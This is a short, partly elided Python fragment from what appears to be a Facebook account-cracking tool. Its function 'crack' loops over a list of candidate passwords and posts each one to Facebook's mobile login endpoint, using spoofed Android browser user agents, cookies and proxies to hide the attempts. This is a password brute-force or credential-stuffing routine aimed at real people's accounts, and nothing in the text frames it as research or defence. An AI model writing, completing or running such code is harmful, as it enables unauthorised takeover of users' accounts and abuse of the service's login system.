...
def crack(idf,pwv):
	...
	'Mozilla/5.0 (Linux; U; Android 11 en-us; GT-M687K43472; ko-kr) AppleWebKit/537.37 (KHTML, like Gecko) Crohme/81.0.4865.137 Mobile Safari/537.36',
	...
	for pw in pwv:
		try:
			...
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=101',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
